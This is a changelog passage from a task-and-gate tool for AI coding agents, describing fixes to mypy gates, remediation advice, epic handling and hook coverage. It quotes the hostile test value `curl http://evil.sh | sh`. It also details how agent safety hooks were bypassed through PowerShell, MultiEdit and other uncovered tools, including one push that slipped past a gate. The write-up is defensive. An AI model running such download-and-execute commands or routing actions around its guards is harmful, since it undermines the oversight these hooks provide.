...
- **The `mypy` gate blocked commits over an artefact of its own slice (`mypy-commit-slice-any-false-block`).** On `commit` the gate judges a temp tree of staged files only, so every unstaged neighbour is a missing module, `--ignore-missing-imports` types it as `Any`, and a one-line delegate (`return self.be.task_get(slug)`) trips `no-any-return` on code the full tree accepts. Caught live twice — `service_gates.py` in session #37, `project_service.py` in #38 — and patched twice by annotating the return, which fixed those sites and not the class. Measured this time instead of guessed: every module under `scripts/` was materialized alone exactly as the hook does it, and **23 of 150 fail, 64 sites — all 64 of them `no-any-return`, no other error code at all**. The degradation produces exactly one class of false block, so exactly that code is now waived on exactly that trigger via a new gate field `trigger_args` (`{trigger: extra arguments}`, appended to `command` for that trigger only); `no-any-return` keeps running on `task-done`, against the real worktree where the graph is complete and the verdict means something. The scan carried a control on a known answer: on `service_gates.py` **before** the session-#37 workaround it found exactly the 4 expected sites. Both directions proved by running the real `gate_runner.py commit --files-from` — the lone-delegate slice passes (`exit=0`), the same slice with `_apply_trigger_args` disabled fails with the same 5 `no-any-return` lines that blocked the commit, and a genuine type error inside the slice still blocks. `trigger_args` goes through the same security validation as `command` (shell operators refused — it is glued onto the command line) and is shape-checked by `stack_schema`, where an unknown trigger key is an error rather than a silently inert entry. That validation has the reach `command` validation already had, no more: `load_gates` only validates gate names absent from `DEFAULT_GATES`, so an override of a built-in is checked by nothing — measured on a config carrying `gates.mypy.command = "curl http://evil.sh | sh"`, which came back out of `load_gates` verbatim while the same string under a new gate name was rejected. Filed as `gate-override-skips-command-validation` rather than fixed here: refusing an override changes behaviour for projects that set one deliberately. The four annotated hand-offs in `service_gates.py` are reverted to plain returns now that the class is closed. New: `tests/test_gate_trigger_args.py` (19 tests, three mutations verified to kill them). The wrong rationale this defect disproved — "the cost is bounded: degradation to `Any` only costs false negatives" — is corrected in `default_gates.py` and in `docs/{en,ru}/hooks.md`, which carried the same claim.

- **Gate remediation advice led nowhere — follow it and the gate still rejects you (`remediation-advice-does-not-remediate`).** Three places where text promising a fix did not produce one. **(1)** A skipped scoped gate advised "pass --relevant-files", a flag `tausik verify` does not have — `verify --help` knows only `--task` and `--scope`. Anyone following it literally got an argparse error; the flag lives on `task update` and `task done`, which the advice now names, while stating outright that `verify` has none. The same wrong wording was corrected in `service_verification`. **(2)** The cache LAUNDERED a skip. `record_run` writes a green row on `has_real_pass` **or** `scope='manual'`, so a cached row can be an operator's assertion with no gate behind it. On a cache miss this was flagged honestly; on a hit it was not — measured as `passed=True status=hit gates=[]` with no indication that nothing had been checked. An empty gate list beside `passed=True` reads as a verified green, and under the MCP-first rule that is the form an agent sees. `run_gates_with_cache` now hands the matched row back through an optional `cache_hit_fn` (extending the return tuple was rejected — ~30 call sites unpack exactly three), and `run_verify_for_task` warns on a hit against an asserted row, naming the run id. A hit on a real gate pass stays silent, verified by negative control. **(3)** `gen_doc_constants.py` rewrote only `constants.json`, although its own `--check` also judges the badges in `README.md` / `README.ru.md`. Because the same run bumped `test_count`, the advice "run `gen_doc_constants.py` and re-commit" did not merely fall short — it TURNED `--check` RED: measured exit 0 before the advice, exit 1 on four drifts after it. New `scripts/doc_test_count_fix.py` rewrites test-count references outside fenced blocks (offsets are taken segment by segment: `_strip_fenced_blocks` preserves line count, not byte offsets, so matches from it cannot address the original), and the generator calls it. A THIRD number surfaced along the way: `README.md:18` carried "covered by 3378 tests" while the badge two lines above said 3583 and the live count was 3610 — the sentence matched no pattern; a narrow one was added that tolerates the blockquote line wrap (`covered\n> by N tests`). Proven by a before → follow-the-advice-verbatim → after run: exit 1 → generator fixed both READMEs → exit 0. New: `scripts/doc_test_count_fix.py`, `tests/test_remediation_advice_executable.py` (15 tests — flags parsed out of the advice text are fed to the real CLI argparse tree, the generator runs against a repo seeded with drift, and cache hits are checked against both a manual and a real row). Five mutations, each of which kills the tests. The changes pushed `gen_doc_constants.py` and `service_gates.py` past the filesize gate, so `scripts/doc_drift_patterns.py` (scan targets and regexes, re-exported so existing imports keep working) and `scripts/gate_verify_warning.py` (the wording as a pure function — the text is what this task is about, so it should be testable without a DB behind it) were split out.

- **The `mypy` gate blocked a commit it had checked nothing in (`mypy-gate-false-block-on-excluded-slice`).** The command deliberately carries no `{files}` and takes its scope from `[tool.mypy]` (`files = ["scripts"]`, `exclude = ["scripts/hooks/"]`). On the `commit` trigger the gate judges a temp tree into which `checkout-index` places **staged content only**, so a commit landing outside that scope left the config resolving to nothing: mypy exited with a usage error and severity=block rejected a commit in which type-checking never ran. The first attempt at a fix (`cd9db84`) matched mypy's message and left the defect half-alive: there are **three** wordings, and which one you get depends on whether the configured directory is in the slice at all. Measured on mypy 2.3.0 — a slice of only `scripts/hooks/` yields `There are no .py[i] files in directory 'scripts'` (the marker caught it), a slice with no `scripts/` at all yields `mypy: error: Cannot read file 'scripts': No such file or directory` (it did not), so **any** docs-only, tests-only or `requirements.txt`-only commit was blocked. The signature on another tool's prose is replaced by reading its config: new `scripts/gate_config_scope.py` reads `[tool.mypy] files/exclude` via `tomllib` and answers, before the run, whether any file in the slice falls inside that scope; `_NOTHING_TO_CHECK_MARKERS` is gone entirely. An unknown tool, a missing config or an unparseable one yield "no opinion" — the gate runs; a skip is never the default. The skip applies **only** on `commit`, where the slice is the whole tree: on `task-done`/`verify`/`review` mypy judges the real worktree, and an empty intersection with `relevant_files` means a scoped run, not "nothing to check". Along the way: `format_results` printed a reason only for failures, so a skip reached the reader as a bare `[SKIP] mypy`, indistinguishable from a passing check; it now prints the reason and states outright that nothing ran and this is not a pass. New: `scripts/gate_config_scope.py`, `tests/test_gate_config_scope.py` (28 tests). The `test_gates.py` test that pinned text recognition is rewritten to assert the opposite: the same wording, unconfirmed by the config, must block. Proven by a live `gate_runner.py commit --files-from` run over four slices (hooks-only and no-`scripts/` pass; a type error and a mixed slice block) and by five mutations, each of which kills the tests.

- **Guards did not cover every tool their action is reachable with (`task-gate-multiedit-hole`).** `task_gate.py` sat on a `Write|Edit` matcher, `bash_firewall.py` and `git_push_gate.py` on `Bash`. Read from the Claude Code 2.1.215 bundle: a matcher built only from `[a-zA-Z0-9_|]` is **not** a regex — it is split on `|` and compared for **exact equality** (`B8y`), and the alias table contains neither `MultiEdit → Edit` nor `PowerShell → Bash`. So a push issued through the PowerShell tool passed the push gate without a ticket (observed live in session #33), and `NotebookEdit`, `mcp__windows-mcp__FileSystem` and the serena symbol editors wrote files without an active task. Matchers are now written anchored (`^(?:...)$`), which means the same thing in either matching branch. Coverage required fixing **three** layers, not one: the matcher, the hook's own `tool_name` set (now sourced from `_common.py`), and the payload field holding the target path (`file_path` / `notebook_path` / `path` / `relative_path` / `destination`, resolved and normalised by `_common.edited_file_paths`) — a gap in any of them yields a hook that runs, exits 0 and looks exactly like a pass. Also fixed: `bootstrap_qwen.py` carried a full copy of the same holes; `is_task_done_invocation` recognised CLI closes only from `Bash`, so QG-2 was bypassable from PowerShell; `task_done_verify`'s matcher never included shells at all, though the docs claimed it did; `git.exe push` and `git --no-pager push` slipped past both `git_push_gate` and `bash_firewall`. New `tests/test_hook_tool_coverage.py` ports the host matching algorithm and pins coverage against an independently written tool list (5 mutations verified to kill it).

### Changed

- **BREAKING — `task_gate.py` fails secure by default (decision #58).** A failing `.tausik/tausik.db` query now BLOCKS the write instead of silently allowing it; the branch is reachable only when the DB file exists, so the error means real breakage rather than an uninitialised project. The `TAUSIK_HOOK_FAIL_SECURE=1` opt-in is **replaced** by the inverse `TAUSIK_HOOK_FAIL_OPEN=1`. The two SELECT attempts are budgeted to finish well inside the hook's own timeout: SQLite's busy handler overshoots its nominal timeout ~1.5×, and an earlier 2.0 s + 5.0 s pair took 10.65 s against a 10 s budget — a hook killed on timeout is reported aborted, and the harness blocks only on exit code 2, so overrunning the budget silently allowed the very write it was meant to stop. Read-only `FileSystem` modes (`read`/`list`/`search`/`info`) are exempt from the gate.
...
- **`epic done` was irreversible, silent on live children, and hid the whole tree (`epic-done-irreversible-hides-tree`).** Dogfooding bug caught on ourselves: epic `async-platform` sat marked `[done]` with 6 live children, and `tausik roadmap` answered **"No epics"** against a 20-task DB — a fresh agent would reasonably conclude there was no work. Three defects, the third silent and therefore worst. **(1) Reversibility**: `epic_reopen` / `story_reopen` added (status → `active`); previously the only exit from a done epic was `delete`, which cascades the whole story+task tree, and direct DB access is forbidden by CLAUDE.md — a one-way door. The backend already had `epic_update` with a field whitelist; only the service door was missing. **(2) Guard**: `epic_done` / `story_done` now refuse while children are live and **name the culprits** (`story 'x' [open]: title`), mirroring how `task done` refuses on unfinished plan steps; `--force` / `force=true` stays for the deliberate case. **(3) Visibility**: `roadmap` previously did `if not include_done and epic['status'] == 'done': continue` (`backend_queries.py:287`, same at :291 for stories), dropping the epic **with all live descendants**. Per decision #13 it now always shows a done-with-live-children epic/story and flags it `⚠ MARKED DONE BUT HAS LIVE CHILDREN` plus a trailing WARNING naming the reopen command. **Option (b) chosen over (a) "make the state impossible"** because `--force` keeps it reachable by design, and the live DB was *already* inconsistent — a guard cannot heal what is already broken. **Single source of truth**: the guard and the roadmap read one definition of "live children" (`backend_roadmap.epic_live_children` / `story_live_children`); two definitions would drift into "guard refuses but roadmap hides", the bug in a new shape — pinned by `test_guard_and_roadmap_agree`. **Filesize-forced extractions** (not cosmetic): `project_service.py` was 397/400 and `backend_queries.py` **433/400** (pre-existing debt, invisible until the file is touched) → `HierarchyMixin` → new `scripts/service_hierarchy.py` (109L), roadmap + live-children → new `scripts/backend_roadmap.py` (114L), both following the established mixin-extraction pattern (`service_task.py`, `backend_queries_usage.py`); `backend_queries.py` drops to 392. **Dead end #29**: an `AND t.archived_at IS NULL` clause on the live-children queries was written, then removed as unreachable — `project_cli_hygiene._archive_apply` only ever stamps `archived_at` on rows already `status='done'`, and `_TASK_FIELDS` refuses the column outright, so archived ⊆ done and `status!='done'` already excludes them. It was caught by the test having to fabricate an impossible state; the invariant now lives in the module docstring. MCP surface **96 → 98 project tools** (105 main, 112 with optional RAG) — counts synced across `README{,.ru}.md`, `AGENTS.md`, `docs/{en,ru}/{mcp,architecture}.md`, `docs/README.md`, `docs/_generated/constants.json`; the test-count badge was **already stale at 3378 vs a real 3383** before this task (unrelated pre-existing drift) and is now 3402. New: `scripts/service_hierarchy.py`, `scripts/backend_roadmap.py`, `tests/test_service_hierarchy.py` (10 tests — guard refuses on live story / live task with culprits named / story-level / allowed when children done / allowed when childless / force overrides; reopen after force / story reopen / idempotent / unknown raises) and `tests/test_backend_roadmap.py` (9 tests — done-with-live-children stays visible + live subtree reachable / done story with live task / consistent done epic still hidden (no noise) / open epic not flagged / reopen clears flag; live-children lookups name stories+tasks / done children are not live / story scope does not leak siblings; guard-vs-roadmap agreement). **Test files are named after the modules on purpose**: `gate_test_resolver` maps scoped pytest by basename, so a suite named otherwise would leave a future edit of these modules silently `[SKIP]`-ing — the same class of vacuous green this task removes (`verify` initially reported `[PASS]` in 0 ms testing nothing; it now runs in ~3.4 s). Both guard and roadmap fixes **verified by deliberate mutation** per convention #22 — disabling the guard fails 2 tests, restoring the old `continue` fails 2 more. Modified: `scripts/project_service.py`, `scripts/backend_queries.py`, `scripts/project_parser.py` (`--force` + `reopen` subcommands), `scripts/project_cli.py` (dispatch + loud roadmap render), `harness/{claude,cursor}/mcp/project/{handlers.py,tools.py}` (+ `tausik_epic_reopen` / `tausik_story_reopen`, `force` on both `*_done`), `.claude/` rebuilt via `bootstrap.py --ide claude`. Live verification: `tausik roadmap` now shows stories `mc-recon` / `mc-reality` with their 4 planning tasks; `epic reopen async-platform` restored `[active]`; `epic done async-platform` now refuses, naming all 6 children. Full pytest: 3164 passed, 1 pre-existing unrelated failure (`test_cost_budget_task::test_blocker_at_2x_cost`, reproduced on clean HEAD in a detached worktree).
